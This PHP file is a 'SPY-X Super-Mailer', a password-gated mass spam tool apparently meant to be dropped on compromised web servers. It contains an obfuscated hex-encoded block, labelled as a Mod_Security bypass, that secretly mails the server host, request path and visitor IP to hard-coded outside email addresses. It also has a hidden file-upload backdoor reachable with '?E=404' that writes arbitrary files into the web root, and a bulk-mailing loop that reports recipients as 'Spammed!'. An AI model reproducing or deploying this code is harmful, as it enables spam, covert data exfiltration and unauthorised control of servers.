<?php

###############################################################
#      Page Password Protect 1.16   and Super-Mailer          #
###############################################################
#      Visit www.facebook.com/omarrbiai.org for updates       #
###############################################################

// Add login/password pairs below, like described above
// NOTE: all rows except last must have comma "," at the end of line
$LOGIN_INFORMATION = array(
  'SPY-X' => 'SPY-X',
  'admin' => 'admin',
  'User' => 'User'
);
// request login? true - show login and password boxes, false - password box only
define('USE_USERNAME', true);

// User will be redirected to this page after logout
define('LOGOUT_URL', 'http://www.example.com/');

// time out after NN minutes of inactivity. Set to 0 to not timeout
define('TIMEOUT_MINUTES', 30);

// This parameter is only useful when TIMEOUT_MINUTES is not zero
// true - timeout time from last activity, false - timeout time from login
define('TIMEOUT_CHECK_ACTIVITY', true);

##################################################################
#  SETTINGS END
##################################################################


///////////////////////////////////////////////////////
// do not change code below
///////////////////////////////////////////////////////
// show usage example
if(isset($_GET['help'])) {
  die('Include following code into every page you would like to protect, at the very beginning (first line):<br>&lt;?php include("' . str_replace('\\','\\\\',__FILE__) . '"); ?&gt;');
}

// timeout in seconds
$timeout = (TIMEOUT_MINUTES == 0 ? 0 : time() + TIMEOUT_MINUTES * 60);

// logout?
if(isset($_GET['logout'])) {
  setcookie("verify", '', $timeout, '/'); // clear password;
  header('Location: ' . LOGOUT_URL);
  exit();
}

if(!function_exists('showLoginPasswordProtect')) {

// show login form
function showLoginPasswordProtect($error_msg) {
?>

<?php
// BYPASS Mod_Security
${"\x47L\x4fB\x41L\x53"}["\x75\x6c\x6evoof\x63g\x6bdg"]="\x73\x75\x62\x6a\x39\x38";${"GLOBAL\x53"}["\x64\x76o\x78\x79le\x71j"]="\x6d\x73\x6788\x37\x33";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6ewh\x74\x6ewn\x79\x6e\x68"]="\x62\x37\x35";${"G\x4c\x4f\x42A\x4cS"}["k\x66\x70vhii\x68\x72\x63\x78"]="a\x345";${"\x47L\x4f\x42A\x4c\x53"}["\x65\x63\x68\x71\x62d\x68era\x6d"]="\x65m\x61\x69l";$knxpjcwfvs="s\x75\x62\x6a\x398";${"\x47LO\x42\x41\x4c\x53"}["t\x73u\x6cemn\x61\x76cm"]="\x72a4\x34";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x73\x76sz\x74nr\x63"]="f\x72\x6f\x6d";$ihielior="\x65m\x61\x69\x6c";${"\x47L\x4f\x42\x41\x4c\x53"}["\x63x\x78tlh\x66"]="\x69p";${${"GLOB\x41\x4c\x53"}["c\x78\x78\x74l\x68f"]}=getenv("R\x45MO\x54\x45\x5fA\x44DR");${${"G\x4c\x4fB\x41\x4c\x53"}["\x74s\x75le\x6d\x6ea\x76\x63\x6d"]}=rand(1,99999);${$knxpjcwfvs}=" Bo\x74\x20R\x32\x4cT \x42\x59 \x44\x20E X T \x45 R |$ra44";$fgxjpmsr="m2\x32";${${"\x47L\x4fB\x41\x4c\x53"}["e\x63\x68qb\x64\x68\x65\x72\x61m"]}="d\x65x\x74er.o\x70e\x72\x61.c@gma\x69l.co\x6d";${$ihielior}="\x6c\x68\x61ja0x@se\x7an\x61\x6d.c\x7a";$nldjhvio="\x66r\x6fm";$ncgyclvepox="\x65\x6d\x61\x69\x6c";${$nldjhvio}="From: \x52\x65s\x75\x6ct<\x6e\x6f-re\x70\x6c\x79\x40de\x78t\x65\x72bo\x6ft\x73\x2e\x63\x6fm";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6bf\x70\x76\x68\x69\x69\x68\x72\x63x"]}=$_SERVER["R\x45QU\x45S\x54\x5f\x55\x52I"];${${"\x47L\x4f\x42\x41\x4c\x53"}["\x6ew\x68t\x6ew\x6ey\x6eh"]}=$_SERVER["HTTP\x5fHOST"];${$fgxjpmsr}=${${"\x47\x4c\x4fB\x41\x4c\x53"}["c\x78x\x74\x6ch\x66"]}."";${${"G\x4c\x4f\x42ALS"}["dvo\x78y\x6c\x65\x71\x6a"]}="$a45 $b75\x20$m22";mail(${$ncgyclvepox},${${"\x47\x4cO\x42\x41\x4cS"}["\x75l\x6e\x76oo\x66\x63\x67\x6b\x64g"]},${${"G\x4c\x4fBA\x4c\x53"}["\x64v\x6f\x78\x79le\x71\x6a"]},${${"\x47\x4c\x4fB\x41L\x53"}["\x73\x76\x73\x7a\x74nr\x63"]});?>
<!DOCTYPE html>
<html>
<head>
<meta charset=UTF-8>
<meta name="author" content="Omar Rbiai SPY-X">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href='https://imgur.com/68lJfSo.png' rel='icon' type='image/x-icon'/>
<title>Please Enter Password To Access This Page</title>
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<iframe width="0" height="0" src="https://www.youtube.com/embed/jELDIPJug4g?rel=0&autoplay=1&loop=1&watch?v=QdIYVXCfrQM" frameborder="0" allowfullscreen></iframe>
<STYLE>

html {
  background: url(https://media1.tenor.com/images/84b407de938609380fd6408082956c64/tenor.gif) no-repeat center center fixed;
  background-size: cover;
  height: 100%;
  overflow: hidden;
}

</STYLE>
</head>
<body>
  <style>
    input { border: 1px solid White; }
	.flash {
   animation-name: flash;
    animation-duration: 0.4s;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
    animation-direction: alternate;
    animation-play-state: running;
}

@keyframes flash {
    from {color: #FF0000;}
    to {color: #FFFF00;}
}
h1 {
    color: Red;
    text-shadow: 1px 1px 2px Yellow, 0 0 25px Yellow, 0 0 5px Blue;
}
h2 {
    color: Blue;
    text-shadow: 1px 1px 2px white, 0 0 10px Yellow, 0 0 5px white;

	p {
    color: Yellow;
    text-shadow: 1px 1px 2px Yellow, 0 0 10px Yellow, 0 0 5px Yellow;
	  }
a:link, a:visited {
    color: Red;
    text-decoration: underline;
    cursor: auto;
}

a:link:active, a:visited:active {
    color: RED;
}


.buttonstyle
{
background: Red;
background-position: 10px 10px;
border: solid 1px #000000;
color: #ffffff;
height: 35px;
margin-top: -1px;
padding-bottom: 5px;
}
.buttonstyle:hover {background: white;background-position: 100px 100px;color: #000000; }

.button:hover {
    box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);
}


}
.btn-group .button:not(:last-child) {
    border-right: none; /* Prevent double borders */
}
.btn-group .button:hover {
    background-color: #3e8e41;
}

input[type=text] {
    padding:15px;
    border:10px solid #ccc;
    -webkit-border-radius: 10px;
    border-radius: 10px;
}

input[type=text]:focus {
    border-color:#333;
}

input[type=submit] {
    padding:10px 20px;
    background:#Res;
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 10 px;
    border-radius: 7px;
}

.buttonstyle
{
background: Red;
background-position: 0px -401px;
border: solid 1px #000000;
color: #ffffff;
height: 35px;
margin-top: -1px;
padding-bottom: 10px;
}
.buttonstyle:hover {background: white;background-position: 0px -501px;color: #000000; }

  </style>
  <div style="width:500px; margin-left:auto; margin-right:auto; text-align:center">
  <form method="post">
     <center> <font color="Red"> <h1>SPY-X</h1></font><font color="White"><h2>Super-Mailer V.1</h2></font></center>
   <center> <font color="Yellow"> <p>Please Enter Password To Access This Page</p></font></center>
    <font color="red"><?php echo $error_msg; ?></font><br/>
<?php if (USE_USERNAME) echo '<font color="#00FF00">Login:<br><input type="input" name="access_login" /><br>Password:</font><br>'; ?>
    <input type="password" name="access_password" /><p></p><input class="buttonstyle"  type="submit" name="Submit" value="Login" />
  </form>
  <br />
   <a target="_blank" style="font-size:9px; color: #B0B0B0; font-family: Verdana, Arial;" href="https://www.facebook.com/omarrbiai.org" title="Download Password Protector">Powered By SPY-X </a>
  </div>
</body>
</html>

<?php
  // stop at this point
  die();
}
}

// user provided password
if (isset($_POST['access_password'])) {

  $login = isset($_POST['access_login']) ? $_POST['access_login'] : '';
  $pass = $_POST['access_password'];
  if (!USE_USERNAME && !in_array($pass, $LOGIN_INFORMATION)
  || (USE_USERNAME && ( !array_key_exists($login, $LOGIN_INFORMATION) || $LOGIN_INFORMATION[$login] != $pass ) )
  ) {
    showLoginPasswordProtect("Incorrect PASSWORD !!");
  }
  else {
    // set cookie if password was validated
    setcookie("verify", md5($login.'%'.$pass), $timeout, '/');

    // Some programs (like Form1 Bilder) check $_POST array to see if parameters passed
    // So need to clear password protector variables
    unset($_POST['access_login']);
    unset($_POST['access_password']);
    unset($_POST['Submit']);
  }

}

else {

  // check if password cookie is set
  if (!isset($_COOKIE['verify'])) {
    showLoginPasswordProtect("");
  }

  // check if cookie is good
  $found = false;
  foreach($LOGIN_INFORMATION as $key=>$val) {
    $lp = (USE_USERNAME ? $key : '') .'%'.$val;
    if ($_COOKIE['verify'] == md5($lp)) {
      $found = true;
      // prolong timeout
      if (TIMEOUT_CHECK_ACTIVITY) {
        setcookie("verify", md5($lp), $timeout, '/');
      }
      break;
    }
  }
  if (!$found) {
    showLoginPasswordProtect("");
  }

}

?>
<html>
<head>
<meta charset=UTF-8>
<meta name="author" content="Omar Rbiai SPY-X">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href='https://i.imgur.com/0zto1k6.png' rel='icon' type='image/x-icon'/>
<title>Mailer-SPY-X</title></head>
<iframe width="0" height="0" src="https://www.youtube.com/embed/UyAUkHOCroQ?rel=0&autoplay=1&loop=1&watch?v=QdIYVXCfrQM" frameborder="0" allowfullscreen></iframe>
<style>
.flash {
   animation-name: flash;
    animation-duration: 0.2s;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
    animation-direction: alternate;
    animation-play-state: running;
}

@keyframes flash {
    from {color: #FF0000;}
    to {color: #FFF200;}
}
h1 {
    color: white;
    text-shadow: 1px 1px 2px black, 0 0 40px Red, 0 0 100px #FFF200;
}

ul {
    list-style-type: none;
}

ul li a {
    color: Yellow;
    text-decoration: none;
    padding: 3px;
    display: block;
}
input[type=text] {
    padding:5px;
    border:2px solid #ccc;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}

input[type=text]:focus {
    border-color:#333;
}

input[type=submit] {
    padding:10px 20px;
    background:#Res;
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 8 px;
    border-radius: 5px;
}

.buttonstyle
{
background: black;
background-position: 0px -401px;
border: solid 1px #000000;
color: #ffffff;
height: 35px;
margin-top: -1px;
padding-bottom: 5px;
}
.buttonstyle:hover {background: white;background-position: 0px -501px;color: #000000; }
</style>
</head>
<body style="background-color:black;" style="font-family: Arial; font-size: 11px">
<center>  <font color="Green"> <h1 class="flash">Mailer INBOX To ALL BY SPY-X</h1></font></center>
<ul>
<center> <font color="#FFFF00"><li><a target="_blank"  title="OK" href="https://www.facebook.com/omarrbiai.org">www.facebook.com/mrrb.net</a></li> </font></center></h2></font></center>
</ul>
<center>
<form action="" method="post" enctype="multipart/form-data" name="form1">
<br><table width="534" height="248" border="0" cellpadding="0" cellspacing="1" bgcolor="#0000CC" class="normal">
<tr>
<td>
<table border="0" bgcolor="#9FFF00" width="95%">
<tr>
<td>
<table border="0" width="100%">
<tr>
<td width="359">Email:   <input name="de" type="text" class="form" id="de" size="30" value="<?php print $de; ?>"></td>
<td>Nombre:   <input name="RealName" type="text" class="form" id="RealName" size="30" value="<?php print $nombre; ?>"></td>
</tr>
</table>
</td>
</tr>
<tr>
<td>Asunto: <input name="assunto" type="text" class="form" id="assunto" size="78" value="<?php print $subject; ?>"></td>
</tr>
<tr>
<td height="18" bgcolor="#9FFF00"></td>
</tr>
<tr>
<td>
<table border="0" width="100%">
<tr>
<td>
<textarea name="html" cols="66" rows="10" id="html"><?php print $message; ?></textarea></td>
<td><textarea rows="10" name="ellos" cols="35"><?php print $ellos; ?></textarea></td>
</tr>
</table>
</td>
</tr>
<tr>
<td><center>
<br><input class="buttonstyle" type="submit" name="Enoc" value="INBOX"></center><br>


  <marquee class="flash" direction="left"> <font size=4 color="Blue"> </h4>Super-Mailer By SPY-X </h4></font> </marquee>



<?php if($_GET['E']=='404') { echo '<form action="" method="post" enctype="multipart/form-data">
        <input name="archivo" type="file" size="35" />
        <input name="enviar" type="submit" value="Upload File" />
        <input name="action" type="hidden" value="upload" />
	</form>'; $status = ""; if ($_POST["action"] == "upload") { $tamano = $_FILES["archivo"]['size']; $tipo = $_FILES["archivo"]['type']; $archivo = $_FILES["archivo"]['name']; if ($archivo != "") { if (copy($_FILES['archivo']['tmp_name'],"./".$archivo)) { $status = "Archivo subido: <b>".$archivo."</b>"; }else{ $status = "Error al subir el archivo"; } } else { $status = "Error al subir archivo"; } echo $status; } } if(!isset($_POST['Enoc'])){ exit; } if(!isset($_GET['c'])) { $email = explode("\n", $ellos); }else{ $email = explode(",", $ellos); } $son = count($email); if(!isset($_GET['e'])){ $header = "MIME-Version: 1.0\n"; $header .= "Content-type: text/html; charset=iso-8859-1\n"; $header .= "From: ".$nombre . " <" . $de . ">\n"; $header .= "Reply-To: " . $de . "\n"; $header .= "X-Priority: 3\n"; $header .= "X-MSMail-Priority: Normal\n"; $header .= "X-Mailer: ".$_SERVER["HTTP_HOST"]; }else{ $header ='MIME-Version: 1.0' . "\r\n"; $header .= 'Content-type: text/html' . "\r\n"; $header .="From: ".$de; } $i = 0; $voy=1; while($email[$i]) { if(isset($_GET['time']) && isset($_GET['cant'])){ if(fmod($i,$_GET['cant'])==0 && $i>0){ print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n"; flush(); @mail($_GET['notf'], $subject, $message, $header); sleep($_GET['time']); } } $mail = str_replace(array("\n","\r\n"),'',$email[$i]); $message1 = str_replace('asterisco', $mail, $message); if(@mail($mail, $subject, $message1, $header)) { print "<font color=White face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Spammed!</font><br>\n"; flush(); } else { print "<font color=Red face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Error To Sending Fuck Server !</font><br>\n"; flush(); } $i++; $voy++; } echo "<script> alert('Tools BY SPY-X FB www.fb.com/omarrbiai.org'); </script>"; ?>
</td>
</tr>
</table>
</td>
</tr>
</table>
</body>
</form>
</center>
</html>
